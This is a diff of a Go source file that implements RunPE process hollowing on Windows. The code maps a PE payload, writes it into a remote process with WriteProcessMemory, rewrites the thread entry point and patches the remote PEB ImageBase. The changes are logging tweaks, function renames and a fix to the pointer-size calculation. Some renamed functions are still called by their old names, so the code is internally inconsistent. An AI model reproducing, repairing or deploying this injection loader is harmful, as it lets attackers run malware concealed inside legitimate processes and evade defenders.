@@ -2,6 +2,8 @@ package main
 
 /*
 #include <string.h>
+#include <stdint.h>
+#include <windows.h>
 #include <stdlib.h>
 */
 import "C"
@@ -81,7 +83,7 @@ func VirtualAllocEx(
 		e = err
 	}
 	addr = ret
-	log.Printf("VirtualAllocEx[%v : %x]: [%v] %v", hProcess, lpAddress, ret, err)
+	log.Printf("VirtualAllocEx[%v : %x]: [%X] %v", hProcess, lpAddress, ret, err)
 	return
 }
 
@@ -245,8 +247,8 @@ func gRelocateModule(
 	if oldBase == 0 {
 		oldBase = gGetImageBase(modulePtr)
 	}
-	log.Println("New Base: ", newBase)
-	log.Println("Old Base: ", oldBase)
+	log.Printf("New Base: %X\n", newBase)
+	log.Printf("Old Base: %X\n", oldBase)
 	if newBase == oldBase {
 		log.Println("Nothing to relocate! oldBase is the same as the newBase!")
 		return true //nothing to relocate
@@ -610,7 +612,7 @@ func gLoadPEModule2(dllRawData uintptr, rSize uint64, vSize *uint64, executable,
 	}
 	// load a virtual image of the PE file at the desired_base address (random if desired_base is NULL):
 	mappedDll := gPERawToVirtual(dllRawData, rSize, vSize, executable, desiredBase)
-	fmt.Printf("MAPPEDDLL: %p\n", mappedDll)
+	fmt.Printf("MAPPEDDLL: %X\n", mappedDll)
 	if mappedDll != 0 {
 		//if the image was loaded at its default base, relocate_module will return always true (because relocating is already done)
 		if relocate && !gRelocateModule(mappedDll, *vSize, mappedDll, 0) {
@@ -640,7 +642,7 @@ func ResumeThread(hThread syscall.Handle) (count int32, e error) {
 func WriteProcessMemory(
 	hProcess syscall.Handle, lpBaseAddress uintptr, data uintptr, size uint64,
 ) (e error) {
-	var numBytesRead uintptr
+	var numBytesRead uint64
 	r, _, err := procWriteProcessMemory.Call(
 		uintptr(hProcess),
 		lpBaseAddress,
@@ -650,7 +652,7 @@ func WriteProcessMemory(
 	if r == 0 {
 		e = err
 	}
-	log.Printf("WriteProcessMemory[%v : %x]: [%v] %v", hProcess, lpBaseAddress, r, err)
+	log.Printf("WriteProcessMemory[%v : %#x]: [%#x] num bytes %d %v", hProcess, lpBaseAddress, r, numBytesRead, err)
 	return
 }
 
@@ -721,8 +723,8 @@ func UpdateImageBase(payload, destImageBase uintptr) bool {
 	return true
 }
 
-//GetEntryPointRVA func
-func GetEntryPointRVA(peBuffer uintptr) uint32 {
+//gGetEntryPointRVA func
+func gGetEntryPointRVA(peBuffer uintptr) uint32 {
 	is64b := gIs64Bit(peBuffer)
 	//update image base in the written content:
 	payloadNTHdr := GetNTHdrs(peBuffer, 0)
@@ -740,8 +742,8 @@ func GetEntryPointRVA(peBuffer uintptr) uint32 {
 	return value
 }
 
-//UpdateRemoteEntryPoint func
-func UpdateRemoteEntryPoint(
+//gUpdateRemoteEntryPoint func
+func gUpdateRemoteEntryPoint(
 	pi *syscall.ProcessInformation, entryPointVA uintptr, is32bit bool,
 ) bool {
 	log.Println("Writing new EP: ", entryPointVA)
@@ -784,8 +786,8 @@ func UpdateRemoteEntryPoint(
 	return true
 }
 
-//GetRemotePebAddr func
-func GetRemotePebAddr(pi *syscall.ProcessInformation, is32bit bool) uintptr {
+//gGetRemotePebAddr func
+func gGetRemotePebAddr(pi *syscall.ProcessInformation, is32bit bool) uintptr {
 	if is32bit {
 		//get initial context of the target:
 		var context WOW64_CONTEXT
@@ -834,9 +836,9 @@ func GetImgBasePebOffset(is32bit bool) uintptr {
 	*/
 	var imgBaseOffset uintptr
 	if is32bit {
-		imgBaseOffset = unsafe.Sizeof(new(uint32)) * 2
+		imgBaseOffset = unsafe.Sizeof(*new(uint32)) * 2
 	} else {
-		imgBaseOffset = unsafe.Sizeof(new(uintptr)) * 2
+		imgBaseOffset = unsafe.Sizeof(*new(uintptr)) * 2
 	}
 	return imgBaseOffset
 }
@@ -848,7 +850,8 @@ func gRedirectToPayload(
 	//1. Calculate VA of the payload's EntryPoint
 	ep := GetEntryPointRVA(loadedPE)
 	epVA := loadBase + uintptr(ep)
-
+	log.Printf("EP in GO: %#x\n", ep)
+	log.Printf("EPVA in GO: %#x\n", epVA)
 	//2. Write the new Entry Point into context of the remote process:
 	if UpdateRemoteEntryPoint(pi, epVA, is32bit) == false {
 		log.Println("Cannot update remote EP!")
@@ -860,16 +863,20 @@ func gRedirectToPayload(
 		log.Println("Failed getting remote PEB address!")
 		return false
 	}
+	log.Printf("Remote Peb Addr in GO: %#x\n", remotePebAddr)
 	// get the offset to the PEB's field where the ImageBase should be saved (depends on architecture):
 	remoteImgBase := remotePebAddr + GetImgBasePebOffset(is32bit)
+	log.Printf("Remote Image Base in GO: %#x\n", remoteImgBase)
 	//calculate size of the field (depends on architecture):
 	var imgBaseSize uint64
 	if is32bit {
-		imgBaseSize = uint64(unsafe.Sizeof(new(uint32)))
+		imgBaseSize = uint64(unsafe.Sizeof(*new(uint32)))
 	} else {
-		imgBaseSize = uint64(unsafe.Sizeof(new(uintptr)))
+		imgBaseSize = uint64(unsafe.Sizeof(*new(uintptr)))
 	}
-
+	log.Printf(
+		"Size of uint32: %d size of uintptr: %d\n", uint64(unsafe.Sizeof(*new(uint32))),
+		uint64(unsafe.Sizeof(*new(uintptr))))
 	//4. Write the payload's ImageBase into remote process' PEB:
 	err := WriteProcessMemory(
 		pi.Process, remoteImgBase, loadBase, imgBaseSize)
@@ -914,7 +921,7 @@ func gRunPE2(
 		log.Println("Error WriteProcessMemory: ", err.Error())
 		return false
 	}
-	log.Println("Loaded at: ", loadedPE)
+	log.Printf("Loaded at: %#x\n", loadedPE)
 	//5. Redirect the remote structures to the injected payload (EntryPoint and ImageBase must be changed):
 	if !gRedirectToPayload(loadedPE, remoteBase, pi, is32bit) {
 		log.Println("Redirecting failed!")
